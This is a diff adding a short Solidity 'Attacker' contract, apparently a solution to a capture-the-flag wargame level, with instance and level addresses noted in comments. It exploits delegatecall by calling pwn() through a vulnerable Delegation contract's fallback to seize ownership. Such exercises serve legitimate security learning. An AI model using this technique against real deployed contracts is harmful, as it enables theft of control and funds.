@@ -1,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Delegate.sol";
+
+contract Attacker {
+    Delegation delegation;
+
+    constructor(address _delegationAddress) {
+        delegation = Delegation(_delegationAddress);
+    }
+
+    function attack() public {
+        bytes4 methodId = bytes4(keccak256("pwn()"));
+        (bool success,) = address(delegation).call(abi.encodeWithSelector(methodId));
+        require(success, "Attack failed");
+    }
+}
+//Instance address  0x4bF49aA16860abdF8818DD24048d90cEEdA6d659
+//0x8e183854f0F047C20821002d44a6760372F77556
+//Level address 0x73379d8B82Fda494ee59555f333DF7D44483fD58
